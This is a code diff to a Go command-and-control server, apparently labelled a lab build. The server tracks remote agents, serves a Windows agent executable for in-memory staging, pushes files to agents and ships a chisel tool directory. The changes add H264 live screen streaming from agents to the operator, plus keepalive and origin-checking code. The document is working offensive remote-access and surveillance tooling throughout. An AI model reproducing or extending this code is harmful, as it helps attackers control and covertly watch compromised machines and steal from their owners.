@@ -19,6 +19,7 @@ import (
 	"crypto/x509"
 	"crypto/x509/pkix"
 	"encoding/base64"
+	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
@@ -39,7 +40,7 @@ import (
 	"github.com/gorilla/websocket"
 )
 
-const serverVersion = "1.6.0-lab-stage"
+const serverVersion = "1.7.0-lab-stage"
 
 type Config struct {
 	ListenAddr     string
@@ -69,40 +70,40 @@ type Config struct {
 	LogFile string
 	AutoTLS bool // auto-generate self-signed certs when cert files missing
 	// v1.6.0 multi-stage: in-memory stager drop (loader fetches agent here)
-	StagePath     string
-	StagePayload  string
+	StagePath      string
+	StagePayload   string
 	StageAuthToken string
 	// v1.9.0: directory for agent tool binaries (chisel, etc.)
-	ToolsDir      string
+	ToolsDir string
 	// Security hardening
 	AllowedOrigins []string
 	RateLimitRPS   float64 // per-IP rate limit (requests per second)
 }
 
 type Agent struct {
-	ID           string    `json:"id"`
-	StableID     string    `json:"stable_id,omitempty"`
-	Hostname     string    `json:"hostname"`
-	Username     string    `json:"username"`
-	OS           string    `json:"os"`
-	Arch         string    `json:"arch"`
-	PID          int       `json:"pid"`
-	Version      string    `json:"version"`
-	Transport    string    `json:"transport,omitempty"` // wss | http
-	RemoteAddr   string    `json:"remote_addr,omitempty"`
-	FirstSeen    time.Time `json:"first_seen"`
-	LastSeen     time.Time `json:"last_seen"`
-	Online       bool      `json:"online"`
-	QueuedJobs   int       `json:"queued_jobs"`
+	ID         string    `json:"id"`
+	StableID   string    `json:"stable_id,omitempty"`
+	Hostname   string    `json:"hostname"`
+	Username   string    `json:"username"`
+	OS         string    `json:"os"`
+	Arch       string    `json:"arch"`
+	PID        int       `json:"pid"`
+	Version    string    `json:"version"`
+	Transport  string    `json:"transport,omitempty"` // wss | http
+	RemoteAddr string    `json:"remote_addr,omitempty"`
+	FirstSeen  time.Time `json:"first_seen"`
+	LastSeen   time.Time `json:"last_seen"`
+	Online     bool      `json:"online"`
+	QueuedJobs int       `json:"queued_jobs"`
 	// Hangame §3-1 presence (from agent heartbeat)
-	GameActive    bool   `json:"game_active"`
-	GameID        string `json:"game_id,omitempty"`
-	GameTitle     string `json:"game_title,omitempty"`
-	GamePID       int    `json:"game_pid,omitempty"`
-	GameSince     int64  `json:"game_since,omitempty"`
-	StreamEnable  bool   `json:"stream_enable"`
-	DashboardLED  string `json:"dashboard_led"` // green | gray
-	GameProfile   string `json:"game_profile,omitempty"`
+	GameActive   bool   `json:"game_active"`
+	GameID       string `json:"game_id,omitempty"`
+	GameTitle    string `json:"game_title,omitempty"`
+	GamePID      int    `json:"game_pid,omitempty"`
+	GameSince    int64  `json:"game_since,omitempty"`
+	StreamEnable bool   `json:"stream_enable"`
+	DashboardLED string `json:"dashboard_led"` // green | gray
+	GameProfile  string `json:"game_profile,omitempty"`
 	conn         *websocket.Conn
 	mu           sync.Mutex
 	pendingQueue []*Job // jobs waiting to send on this session
@@ -125,28 +126,32 @@ type Job struct {
 }
 
 type persistentState struct {
-	SavedAt time.Time       `json:"saved_at"`
-	Agents  []persistAgent  `json:"agents"`
-	Jobs    []*Job          `json:"jobs"`
+	SavedAt time.Time      `json:"saved_at"`
+	Agents  []persistAgent `json:"agents"`
+	Jobs    []*Job         `json:"jobs"`
 }
 
 type persistAgent struct {
-	ID         string    `json:"id"`
-	StableID   string    `json:"stable_id,omitempty"`
-	Hostname   string    `json:"hostname"`
-	Username   string    `json:"username"`
-	OS         string    `json:"os"`
-	Arch       string    `json:"arch"`
-	PID        int       `json:"pid"`
-	Version    string    `json:"version"`
-	Transport  string    `json:"transport,omitempty"`
-	FirstSeen  time.Time `json:"first_seen"`
-	LastSeen   time.Time `json:"last_seen"`
+	ID        string    `json:"id"`
+	StableID  string    `json:"stable_id,omitempty"`
+	Hostname  string    `json:"hostname"`
+	Username  string    `json:"username"`
+	OS        string    `json:"os"`
+	Arch      string    `json:"arch"`
+	PID       int       `json:"pid"`
+	Version   string    `json:"version"`
+	Transport string    `json:"transport,omitempty"`
+	FirstSeen time.Time `json:"first_seen"`
+	LastSeen  time.Time `json:"last_seen"`
 }
 
 var (
 	cfg      Config
-	upgrader = websocket.Upgrader{CheckOrigin: checkWebSocketOrigin}
+	upgrader = websocket.Upgrader{
+		CheckOrigin:     checkWebSocketOrigin,
+		ReadBufferSize:  64 * 1024,
+		WriteBufferSize: 64 * 1024,
+	}
 
 	agentsMu sync.RWMutex
 	agents   = map[string]*Agent{} // key = agent id (stable)
@@ -157,15 +162,23 @@ var (
 	stateMu   sync.Mutex
 	persistCh = make(chan struct{}, 1)
 
-	logFile   *os.File
-	logMu     sync.Mutex
+	logFile *os.File
+	logMu   sync.Mutex
 
 	// live stream frames: agentID -> latest frame envelope
 	streamMu     sync.RWMutex
 	streamFrames = map[string]*StreamFrame{}
+	// H264 fMP4 live stream state (agentID -> init + media segment ring)
+	streamInit   = map[string]*StreamInit{}
+	streamSegs   = map[string][]*StreamSeg{}
+	streamSegMax = 12
+	// 이벤트 대기 좌표: 세그 도착 시 close로 롱폴 웨이커 일괄 기상(데이터 없으면 무부하 대기)
+	// wakeMu는 streamMu와 별도 락 — 생산자가 streamMu 홀드 중 notify 가능(교착 방지)
+	streamWake = map[string]chan struct{}{}
+	wakeMu     sync.Mutex
 )
 
-// StreamFrame is the latest live frame pushed by an agent.
+// StreamFrame is the latest live frame pushed by an agent (legacy JPEG mode).
 type StreamFrame struct {
 	AgentID    string    `json:"agent_id"`
 	Frame      uint64    `json:"frame"`
@@ -174,6 +187,31 @@ type StreamFrame struct {
 	SHA256     string    `json:"sha256,omitempty"`
 	DataB64    string    `json:"data_b64"`
 	ReceivedAt time.Time `json:"received_at"`
+}
+
+// StreamInit is the fMP4 init segment (ftyp+moov) for an agent's H264 stream.
+// Raw is the single storage format; base64 only appears at the JSON edge
+// (legacy agents ingress as data_b64 and are decoded once, legacy admin
+// clients are served data_b64 encoded on the fly).
+type StreamInit struct {
+	AgentID    string
+	Stream     int64
+	MIME       string
+	Codec      string
+	Size       int
+	Raw        []byte
+	ReceivedAt time.Time
+}
+
+// StreamSeg is one fMP4 media segment (moof+mdat) of an agent's H264 stream.
+type StreamSeg struct {
+	AgentID    string
+	Stream     int64
+	Seq        int64
+	Size       int
+	MIME       string
+	Raw        []byte
+	ReceivedAt time.Time
 }
 
 func logPrintf(format string, v ...interface{}) {
@@ -266,6 +304,7 @@ func main() {
 	mux.HandleFunc("/admin/upload", requireAdmin(handleAdminUpload))
 	mux.HandleFunc("/admin/download", requireAdmin(handleAdminDownload))
 	mux.HandleFunc("/admin/stream", requireAdmin(handleAdminStream))
+	mux.HandleFunc("/admin/wsstream", requireAdmin(handleAdminWSStream))
 
 	mux.HandleFunc("/admin/file", requireAdmin(handleAdminFileGet))
 	// v1.6.0 multi-stage: loader fetches raw agent PE for in-memory run
@@ -317,29 +356,58 @@ func addr() string {
 
 // checkWebSocketOrigin validates WebSocket Origin header.
 // Allows empty origin (non-browser clients like native agents).
-// When Origin is present, validates against allowed origins list.
+// When Origin is present, validates against:
+//   - loopback hosts (localhost, 127.0.0.1, ::1)
+//   - the host the browser is actually connected to (self-reference via
+//     r.Host, e.g. operating the viewer at https://IP:8443)
+//   - the configured allowed origins list (Host field always stripped
+//     of scheme and port before comparison)
 func checkWebSocketOrigin(r *http.Request) bool {
 	origin := r.Header.Get("Origin")
 	if origin == "" {
 		return true // non-browser clients (native agents)
 	}
-	// Strip scheme for comparison
-	origin = strings.TrimPrefix(origin, "https://")
-	origin = strings.TrimPrefix(origin, "http://")
-	origin = strings.TrimSuffix(origin, "/")
-	// Always allow self-reference (agent connects to own server)
-	selfHost := strings.Split(cfg.ListenAddr, ":")[0]
-	if origin == selfHost || origin == "localhost" || origin == "127.0.0.1" {
+	oh := originHostPort(origin)
+	if oh == "" || oh == "null" {
+		logPrintf("WS origin rejected: %q (remote=%s)", origin, r.RemoteAddr)
+		return false
+	}
+	switch oh {
+	case "localhost", "127.0.0.1", "[::1]", "::1":
 		return true
 	}
-	// Check allowed origins list
+	// Self-reference: origin host vs the Host header the browser sent.
+	if reqHost := originHostPort("https://" + r.Host); reqHost != "" && oh == reqHost {
+		return true
+	}
+	// Configured listen address when it names a host (":8443" yields "").
+	if lh := originHostPort("https://" + cfg.ListenAddr); lh != "" && oh == lh {
+		return true
+	}
+	// Check allowed origins list (normalize similarly for tolerance).
 	for _, allowed := range cfg.AllowedOrigins {
-		if allowed == "*" || origin == allowed {
+		if allowed == "*" || oh == originHostPort(allowed) {
 			return true
 		}
 	}
-	logPrintf("WS origin rejected: %s (remote=%s)", r.Header.Get("Origin"), r.RemoteAddr)
+	logPrintf("WS origin rejected: %s (host=%s remote=%s)", origin, oh, r.RemoteAddr)
 	return false
+}
+
+// originHostPort trims the scheme, trailing slash and port so host
+// comparisons operate on bare host names (bracketed IPv6 keeps brackets).
+func originHostPort(v string) string {
+	v = strings.TrimSpace(v)
+	v = strings.TrimPrefix(v, "https://")
+	v = strings.TrimPrefix(v, "http://")
+	v = strings.TrimSuffix(v, "/")
+	if strings.Contains(v, "::") && !strings.HasPrefix(v, "[") {
+		return v // bare IPv6 literal: leave as-is
+	}
+	if i := strings.LastIndex(v, ":"); i != -1 && !strings.Contains(v[i:], "]") {
+		v = v[:i]
+	}
+	return v
 }
 
 // ---------- Per-IP rate limiter ----------
@@ -546,7 +614,7 @@ func loadConfig() Config {
 		StagePayload:   env("STAGE_PAYLOAD_PATH", "./bin/agent_win_amd64.exe"),
 		StageAuthToken: env("STAGE_AUTH_TOKEN", ""),
 		// Security hardening
-		AllowedOrigins: parseCSVPaths(env("C2_ALLOWED_ORIGINS", "")),
+		AllowedOrigins: parseCSVHosts(env("C2_ALLOWED_ORIGINS", "")),
 		RateLimitRPS:   envFloat("C2_RATE_LIMIT_RPS", 10),
 	}
 	// B-H7 URI list
@@ -679,6 +747,11 @@ func extractToken(r *http.Request) string {
 	if ah := r.Header.Get("Authorization"); strings.HasPrefix(strings.ToLower(ah), "bearer ") {
 		return strings.TrimSpace(ah[7:])
 	}
+	// Browsers cannot set custom headers on a WebSocket handshake, so the
+	// viewer leg (/admin/wsstream) passes the token as a query param.
+	if t := r.URL.Query().Get("token"); t != "" {
+		return t
+	}
 	return ""
 }
 
@@ -712,20 +785,20 @@ func handleHealth(w http.ResponseWriter, r *http.Request) {
 	nJobs := len(jobs)
 	jobsMu.RUnlock()
 	writeJSON(w, 200, map[string]interface{}{
-		"status":       "ok",
-		"server_ver":   serverVersion,
-		"agents":       nAgents,
-		"online":       online,
-		"jobs":         nJobs,
-		"persist":      cfg.PersistState,
-		"kill_date":    killDateUnix(),
-		"file_max":     cfg.FileMaxBytes,
-		"beacon_path":  cfg.BeaconPath,
-		"beacon_uris":  cfg.BeaconURIs,
-		"agent_ws":     cfg.AgentWSPath,
-		"transports":   []string{"wss", "http"},
-		"crypto":       cfg.CryptoOn,
-		"malleable":    true,
+		"status":      "ok",
+		"server_ver":  serverVersion,
+		"agents":      nAgents,
+		"online":      online,
+		"jobs":        nJobs,
+		"persist":     cfg.PersistState,
+		"kill_date":   killDateUnix(),
+		"file_max":    cfg.FileMaxBytes,
+		"beacon_path": cfg.BeaconPath,
+		"beacon_uris": cfg.BeaconURIs,
+		"agent_ws":    cfg.AgentWSPath,
+		"transports":  []string{"wss", "http"},
+		"crypto":      cfg.CryptoOn,
+		"malleable":   true,
 	})
 }
 
@@ -781,6 +854,37 @@ func handleAgentWS(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	defer conn.Close()
+
+	// Server-driven keepalive (fix for repeated WS drops): ping the peer every
+	// pingPeriod; a healthy peer (websocket-client auto-responds to ping) answers
+	// with a pong, which refreshes the read deadline. A dead peer fails the
+	// pong-wait deadline and is dropped. This replaces the previous fixed
+	// 3-minute read deadline, which silently killed any client whose application
+	// heartbeat stalled for >3min (stream_frame push froze until re-register).
+	const (
+		writeWait  = 10 * time.Second
+		pongWait   = 60 * time.Second
+		pingPeriod = 30 * time.Second
+	)
+	_ = conn.SetReadDeadline(time.Now().Add(pongWait))
+	conn.SetPongHandler(func(string) error {
+		_ = conn.SetReadDeadline(time.Now().Add(pongWait))
+		return nil
+	})
+	pingDone := make(chan struct{})
+	defer close(pingDone)
+	go func() {
+		t := time.NewTicker(pingPeriod)
+		defer t.Stop()
+		for {
+			select {
+			case <-t.C:
+				_ = conn.WriteControl(websocket.PingMessage, []byte{}, time.Now().Add(writeWait))
+			case <-pingDone:
+				return
+			}
+		}
+	}()
 
 	var reg map[string]interface{}
 	_ = conn.SetReadDeadline(time.Now().Add(15 * time.Second))
@@ -839,9 +943,39 @@ func handleAgentWS(w http.ResponseWriter, r *http.Request) {
 	flushJobsToWS(agent)
 
 	for {
-		_ = conn.SetReadDeadline(time.Now().Add(3 * time.Minute))
-		var msg map[string]interface{}
-		if err := wsReadMsg(conn, &msg); err != nil {
+		// Deadline is refreshed on every data message (heartbeat/stream_frame)
+		// and on every pong (see SetPongHandler above), so a healthy client is
+		// never dropped for idle; only a truly dead peer times out.
+		_ = conn.SetReadDeadline(time.Now().Add(pongWait))
+		_, raw, err := conn.ReadMessage()
+		if err != nil {
+			logPrintf("WS read fail id=%s: %v", agent.ID, err)
+			break
+		}
+		// Binary stream frame fast path. NB: dispatch is on the 0xB1 magic
+		// byte, NOT the WS message type — legacy clients already send sealed
+		// JSON text as binary opcodes, so mt alone cannot distinguish.
+		if len(raw) > 1 && raw[0] == binStreamMagic {
+			key := getConnKey(conn)
+			if key == nil {
+				key = cfg.CryptoKey
+			}
+			pt, derr := aeadOpenRaw(key, raw[1:])
+			if derr != nil {
+				// one bad frame must not kill the seat connection
+				logPrintf("binstream decrypt fail id=%s: %v", agent.ID, derr)
+				continue
+			}
+			applyStreamFrameBinary(agent.ID, pt)
+			continue
+		}
+		key := getConnKey(conn)
+		if key == nil {
+			key = cfg.CryptoKey
+		}
+		msg, derr := decodeAgentBodyKey(key, raw)
+		if derr != nil {
+			logPrintf("WS read fail id=%s: %v", agent.ID, derr)
 			break
 		}
 		handleAgentMessage(agent, msg)
@@ -885,6 +1019,7 @@ func registerReply(agentID string, queuedFlush bool) map[string]interface{} {
 		"transports":      []string{"wss", "http"},
 		"crypto":          cfg.CryptoOn,
 		"crypto_alg":      "",
+		"bin_stream":      true, // server accepts 0xB1 binary stream frames on agent WS
 	}
 	if cfg.CryptoOn {
 		m["crypto_alg"] = "aes-256-gcm"
@@ -1033,13 +1168,17 @@ func applyStreamFrame(agentID string, msg map[string]interface{}) {
 		return
 	}
 	var env struct {
-		Type     string `json:"type"`
-		AgentID  string `json:"agent_id"`
-		Frame    uint64 `json:"frame"`
-		Size     int    `json:"size"`
-		MIME     string `json:"mime"`
-		SHA256   string `json:"sha256"`
-		DataB64  string `json:"data_b64"`
+		Type    string `json:"type"`
+		AgentID string `json:"agent_id"`
+		Frame   uint64 `json:"frame"`
+		Stream  int64  `json:"stream"`
+		SegType string `json:"seg_type"`
+		Seq     int64  `json:"seq"`
+		Size    int    `json:"size"`
+		MIME    string `json:"mime"`
+		Codec   string `json:"codec"`
+		SHA256  string `json:"sha256"`
+		DataB64 string `json:"data_b64"`
 	}
 	if err := json.Unmarshal([]byte(payload), &env); err != nil {
 		return
@@ -1047,17 +1186,117 @@ func applyStreamFrame(agentID string, msg map[string]interface{}) {
 	if env.DataB64 == "" {
 		return
 	}
-	streamMu.Lock()
-	streamFrames[agentID] = &StreamFrame{
-		AgentID:    agentID,
-		Frame:      env.Frame,
-		Size:       env.Size,
-		MIME:       env.MIME,
-		SHA256:     env.SHA256,
-		DataB64:    env.DataB64,
-		ReceivedAt: time.Now().UTC(),
+	now := time.Now().UTC()
+	if env.SegType == "init" || env.SegType == "media" {
+		// H264 path: decode base64 once at ingress; storage is Raw.
+		rawSeg, derr := base64.StdEncoding.DecodeString(env.DataB64)
+		if derr != nil {
+			return
+		}
+		streamMu.Lock()
+		defer streamMu.Unlock()
+		if env.SegType == "init" {
+			// 새 스트림 세대 시작 → media ring 초기화
+			streamInit[agentID] = &StreamInit{
+				AgentID:    agentID,
+				Stream:     env.Stream,
+				MIME:       env.MIME,
+				Codec:      env.Codec,
+				Size:       env.Size,
+				Raw:        rawSeg,
+				ReceivedAt: now,
+			}
+			streamSegs[agentID] = nil
+			streamNotify(agentID) // init 도착 → 링 무시 대기자 재평가
+			return
+		}
+		if init, ok := streamInit[agentID]; ok && init.Stream == env.Stream {
+			segs := streamSegs[agentID]
+			segs = append(segs, &StreamSeg{
+				AgentID:    agentID,
+				Stream:     env.Stream,
+				Seq:        env.Seq,
+				Size:       env.Size,
+				MIME:       env.MIME,
+				Raw:        rawSeg,
+				ReceivedAt: now,
+			})
+			if len(segs) > streamSegMax {
+				segs = segs[len(segs)-streamSegMax:]
+			}
+			streamSegs[agentID] = segs
+			streamNotify(agentID) // 세그 도착 → 대기 롱폴 즉시 기상
+		}
+		return
 	}
-	streamMu.Unlock()
+	streamMu.Lock()
+	defer streamMu.Unlock()
+	switch env.SegType {
+	default:
+		// legacy JPEG frame (seg_type 미지정)
+		streamFrames[agentID] = &StreamFrame{
+			AgentID:    agentID,
+			Frame:      env.Frame,
+			Size:       env.Size,
+			MIME:       env.MIME,
+			SHA256:     env.SHA256,
+			DataB64:    env.DataB64,
+			ReceivedAt: now,
+		}
+	}
+}
+
+// applyStreamFrameBinary stores one binary stream frame (see binStreamMagic).
+// frame: kind(1) || stream(8,LE) || seq(8,LE) || codecLen(1) || codec || payload
+// kind: 1=init (payload=ftyp+moov), 2=media (payload=moof+mdat).
+// Integrity comes from the GCM tag, so no per-frame sha256 is carried.
+func applyStreamFrameBinary(agentID string, frame []byte) {
+	if len(frame) < 18 {
+		return
+	}
+	kind := frame[0]
+	stream := int64(binary.LittleEndian.Uint64(frame[1:9]))
+	seq := int64(binary.LittleEndian.Uint64(frame[9:17]))
+	cl := int(frame[17])
+	if len(frame) < 18+cl {
+		return
+	}
+	codec := string(frame[18 : 18+cl])
+	payload := frame[18+cl:]
+	now := time.Now().UTC()
+	streamMu.Lock()
+	defer streamMu.Unlock()
+	switch kind {
+	case 1: // init: new stream generation resets the media ring
+		streamInit[agentID] = &StreamInit{
+			AgentID:    agentID,
+			Stream:     stream,
+			MIME:       "video/mp4",
+			Codec:      codec,
+			Size:       len(payload),
+			Raw:        payload,
+			ReceivedAt: now,
+		}
+		streamSegs[agentID] = nil
+		streamNotify(agentID) // init 도착 → 링 무시 대기자 재평가
+	case 2: // media
+		if init, ok := streamInit[agentID]; ok && init.Stream == stream {
+			segs := append(streamSegs[agentID], &StreamSeg{
+				AgentID:    agentID,
+				Stream:     stream,
+				Seq:        seq,
+				Size:       len(payload),
+				MIME:       "video/mp4",
+				Raw:        payload,
+				ReceivedAt: now,
+			})
+			if len(segs) > streamSegMax {
+				segs = segs[len(segs)-streamSegMax:]
+			}
+			streamSegs[agentID] = segs
+			streamNotify(agentID) // 세그 도착 → 대기 롱폴 즉시 기상
+		}
+	}
 }
 
 func applyResult(msg map[string]interface{}) {
@@ -1308,8 +1547,8 @@ func handleAdminAgents(w http.ResponseWriter, r *http.Request) {
 	writeJSON(w, 200, map[string]interface{}{"agents": list, "count": len(list)})
 }
 
-// handleAdminStream returns the latest live frame for an agent.
-// GET /admin/stream?agent_id=X  (optionally &wait_sec=N to block until a new frame)
+// handleAdminStream returns the latest live frame (H264 fMP4 or legacy JPEG) for an agent.
+// GET /admin/stream?agent_id=X  (optionally &wait_sec=N to block until available, &since_seq=N for H264)
 func handleAdminStream(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodGet {
 		http.Error(w, "method not allowed", 405)
@@ -1326,21 +1565,282 @@ func handleAdminStream(w http.ResponseWriter, r *http.Request) {
 			waitSec = n
 		}
 	}
+	sinceSeq := int64(-1)
+	if v := r.URL.Query().Get("since_seq"); v != "" {
+		if n, err := strconv.ParseInt(v, 10, 64); err == nil {
+			sinceSeq = n
+		}
+	}
+	rawFmt := r.URL.Query().Get("format") == "raw"
 	deadline := time.Now().Add(time.Duration(waitSec) * time.Second)
+	start := time.Now() // v19: 롱폴 대기→서빙 지연 측정 기준
 	for {
 		streamMu.RLock()
-		f := streamFrames[agentID]
+		init := streamInit[agentID]
+		var segs []*StreamSeg
+		if init != nil {
+			segs = append(segs, streamSegs[agentID]...)
+		}
+		jpeg := streamFrames[agentID]
 		streamMu.RUnlock()
-		if f != nil {
-			writeJSON(w, 200, f)
+
+		if init != nil {
+			// H264 mode: init + media segments with seq > sinceSeq
+			out := make([]*StreamSeg, 0, len(segs))
+			latest := int64(0)
+			sum := 0
+			for _, s := range segs {
+				if s.Seq > latest {
+					latest = s.Seq
+				}
+				if s.Seq > sinceSeq {
+					out = append(out, s)
+					sum += s.Size
+				}
+			}
+			if rawFmt {
+				if len(out) == 0 {
+					// v19: 백로그 소진 후 신규 세그 없음 — 이벤트 대기로 홀드.
+					// 즉시 빈 응답을 반복하면 브라우저 0ms 재요청 루프가 요청 폭풍이 되므로,
+					// 세그 도착(wake)까지 무부하 대기하고 창 끝까지만 눕게 되면 204(재시작 백오프 신호).
+					if waitSec <= 0 || time.Now().After(deadline) {
+						w.WriteHeader(http.StatusNoContent)
+						return
+					}
+					wc := wakeChan(agentID)
+					select {
+					case <-wc:
+					case <-time.After(300 * time.Millisecond):
+					}
+					continue
+				}
+				// Binary long-poll response: concatenated records
+				//   kind(1) || stream(8,LE) || seq(8,LE) || codecLen(1) || codec || payloadLen(4,LE) || payload
+				// No base64/JSON on the viewer leg (it crosses the internet).
+				logPrintf("poll serve: %s segs=%d bytes~%d waited_ms=%d", agentID, len(out), sum, time.Since(start).Milliseconds())
+				w.Header().Set("Content-Type", "application/octet-stream")
+				w.Header().Set("Cache-Control", "no-store")
+				w.WriteHeader(200)
+				writeStreamRawRecord(w, 1, init.Stream, 0, init.Codec, init.Raw)
+				for _, s := range out {
+					writeStreamRawRecord(w, 2, s.Stream, s.Seq, "", s.Raw)
+				}
+				return
+			}
+			writeJSON(w, 200, map[string]interface{}{
+				"mode":       "h264",
+				"agent_id":   agentID,
+				"init":       streamInitJSON(init),
+				"segments":   streamSegsJSON(out),
+				"latest_seq": latest,
+			})
+			return
+		}
+		if jpeg != nil {
+			writeJSON(w, 200, jpeg)
 			return
 		}
 		if waitSec <= 0 || time.Now().After(deadline) {
 			writeJSON(w, 404, map[string]interface{}{"error": "no stream frame yet", "agent_id": agentID})
 			return
 		}
-		time.Sleep(500 * time.Millisecond)
+		// v19: 이벤트 대기 — 세그 도착 시 즉시 깨어 재검사, 데이터 없으면 무부하 대기(sleep 폐지)
+		wc := wakeChan(agentID)
+		select {
+		case <-wc:
+		case <-time.After(300 * time.Millisecond):
+		}
 	}
+}
+
+// streamRawRecord appends one binary stream record to dst (see handleAdminStream rawFmt):
+// kind(1) || stream(8,LE) || seq(8,LE) || codecLen(1) || codec || payloadLen(4,LE) || payload
+func streamRawRecord(dst []byte, kind byte, stream, seq int64, codec string, payload []byte) []byte {
+	cl := len(codec)
+	if cl > 255 {
+		cl = 255
+	}
+	dst = append(dst, kind)
+	var b8 [8]byte
+	binary.LittleEndian.PutUint64(b8[:], uint64(stream))
+	dst = append(dst, b8[:]...)
+	binary.LittleEndian.PutUint64(b8[:], uint64(seq))
+	dst = append(dst, b8[:]...)
+	dst = append(dst, byte(cl))
+	dst = append(dst, codec[:cl]...)
+	var b4 [4]byte
+	binary.LittleEndian.PutUint32(b4[:], uint32(len(payload)))
+	dst = append(dst, b4[:]...)
+	return append(dst, payload...)
+}
+
+// writeStreamRawRecord emits one binary stream record (see handleAdminStream rawFmt).
+func writeStreamRawRecord(w http.ResponseWriter, kind byte, stream, seq int64, codec string, payload []byte) {
+	buf := streamRawRecord(make([]byte, 0, 22+len(codec)+len(payload)), kind, stream, seq, codec, payload)
+	_, _ = w.Write(buf)
+}
+
+// wakeChan returns the current wake channel for agent (lazy create).
+func wakeChan(agentID string) chan struct{} {
+	wakeMu.Lock()
+	defer wakeMu.Unlock()
+	c, ok := streamWake[agentID]
+	if !ok {
+		c = make(chan struct{})
+		streamWake[agentID] = c
+	}
+	return c
+}
+
+// streamNotify broadcasts a wake to all pending long-polls for agent.
+// wakeMu(streamMu 아님)를 쓴다 — 생산자가 streamMu 홀드 중 호출해도 교착 없음.
+func streamNotify(agentID string) {
+	wakeMu.Lock()
+	defer wakeMu.Unlock()
+	if c, ok := streamWake[agentID]; ok {
+		close(c)
+		streamWake[agentID] = make(chan struct{})
+	}
+}
+
+// handleAdminWSStream is the browser-facing WebSocket push leg for the H264
+// live stream: GET /admin/wsstream?agent_id=X&token=... (token in query because
+// browsers cannot set WS handshake headers; see extractToken). Pushes the init
+// record plus every new ring segment as binary frames in the same record wire
+// format the HTTP raw leg emits, so handleH264Raw parses both unchanged.
+func handleAdminWSStream(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		http.Error(w, "method not allowed", 405)
+		return
+	}
+	agentID := r.URL.Query().Get("agent_id")
+	if agentID == "" {
+		http.Error(w, "agent_id required", 400)
+		return
+	}
+	conn, err := upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		logPrintf("wsstream upgrade: %v", err)
+		return
+	}
+	defer conn.Close()
+
+	const (
+		writeWait  = 10 * time.Second
+		pongWait   = 60 * time.Second
+		pingPeriod = 30 * time.Second
+	)
+	_ = conn.SetReadDeadline(time.Now().Add(pongWait))
+	conn.SetPongHandler(func(string) error {
+		_ = conn.SetReadDeadline(time.Now().Add(pongWait))
+		return nil
+	})
+	pingDone := make(chan struct{})
+	defer close(pingDone)
+	go func() {
+		t := time.NewTicker(pingPeriod)
+		defer t.Stop()
+		for {
+			select {
+			case <-t.C:
+				_ = conn.WriteControl(websocket.PingMessage, []byte{}, time.Now().Add(writeWait))
+			case <-pingDone:
+				return
+			}
+		}
+	}()
+
+	// Read pump: drains close frames; a dead browser or proxy fails the
+	// pong-wait read deadline and tears the connection down.
+	dead := make(chan struct{})
+	go func() {
+		defer close(dead)
+		for {
+			if _, _, err := conn.ReadMessage(); err != nil {
+				return
+			}
+		}
+	}()
+
+	writeRecord := func(kind byte, stream, seq int64, codec string, payload []byte) bool {
+		_ = conn.SetWriteDeadline(time.Now().Add(writeWait))
+		buf := streamRawRecord(make([]byte, 0, 22+len(codec)+len(payload)), kind, stream, seq, codec, payload)
+		return conn.WriteMessage(websocket.BinaryMessage, buf) == nil
+	}
+
+	var (
+		haveInit  bool
+		curStream int64
+		lastSeq   = int64(-1)
+	)
+	ticker := time.NewTicker(50 * time.Millisecond)
+	defer ticker.Stop()
+	for {
+		select {
+		case <-dead:
+			return
+		case <-ticker.C:
+		}
+		streamMu.RLock()
+		init := streamInit[agentID]
+		var segs []*StreamSeg
+		if init != nil {
+			segs = append(segs, streamSegs[agentID]...)
+		}
+		streamMu.RUnlock()
+		if init == nil {
+			continue
+		}
+		if !haveInit || init.Stream != curStream {
+			// First scan after connect (or a new stream generation): push the
+			// init record immediately; the client trims the ring backlog.
+			if !writeRecord(1, init.Stream, 0, init.Codec, init.Raw) {
+				return
+			}
+			haveInit = true
+			curStream = init.Stream
+			lastSeq = -1
+		}
+		for _, s := range segs {
+			if s.Seq <= lastSeq {
+				continue
+			}
+			if !writeRecord(2, s.Stream, s.Seq, "", s.Raw) {
+				return
+			}
+			lastSeq = s.Seq
+		}
+	}
+}
+
+// streamInitJSON/streamSegsJSON project Raw storage onto the legacy JSON wire
+// shape (data_b64) so old admin clients keep working unchanged.
+func streamInitJSON(s *StreamInit) map[string]interface{} {
+	return map[string]interface{}{
+		"agent_id":    s.AgentID,
+		"stream":      s.Stream,
+		"mime":        s.MIME,
+		"codec":       s.Codec,
+		"size":        s.Size,
+		"data_b64":    base64.StdEncoding.EncodeToString(s.Raw),
+		"received_at": s.ReceivedAt,
+	}
+}
+
+func streamSegsJSON(segs []*StreamSeg) []map[string]interface{} {
+	out := make([]map[string]interface{}, 0, len(segs))
+	for _, s := range segs {
+		out = append(out, map[string]interface{}{
+			"agent_id":    s.AgentID,
+			"stream":      s.Stream,
+			"seq":         s.Seq,
+			"size":        s.Size,
+			"mime":        s.MIME,
+			"data_b64":    base64.StdEncoding.EncodeToString(s.Raw),
+			"received_at": s.ReceivedAt,
+		})
+	}
+	return out
 }
 
 func softOfflineHTTP(idle time.Duration) {
@@ -1544,9 +2044,9 @@ func handleAdminUpload(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	var req struct {
-		AgentID  string `json:"agent_id"`
-		Path     string `json:"path"`
-		DataB64  string `json:"data_b64"`
+		AgentID   string `json:"agent_id"`
+		Path      string `json:"path"`
+		DataB64   string `json:"data_b64"`
 		LocalPath string `json:"local_path"` // server-side file under DATA_DIR/files or absolute lab path
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
@@ -1614,14 +2114,14 @@ func handleAdminUpload(w http.ResponseWriter, r *http.Request) {
 			part = raw[start:end]
 		}
 		payloadObj := map[string]interface{}{
-			"path":         req.Path,
-			"transfer_id":  transferID,
-			"chunk_index":  i,
-			"chunk_count":  chunkCount,
-			"total_size":   len(raw),
-			"offset":       start,
-			"sha256":       sha,
-			"chunk_b64":    base64.StdEncoding.EncodeToString(part),
+			"path":        req.Path,
+			"transfer_id": transferID,
+			"chunk_index": i,
+			"chunk_count": chunkCount,
+			"total_size":  len(raw),
+			"offset":      start,
+			"sha256":      sha,
+			"chunk_b64":   base64.StdEncoding.EncodeToString(part),
 		}
 		pb, _ := json.Marshal(payloadObj)
 		job, status, err := enqueueAndMaybeSend(req.AgentID, "upload", string(pb), "")
@@ -1632,14 +2132,14 @@ func handleAdminUpload(w http.ResponseWriter, r *http.Request) {
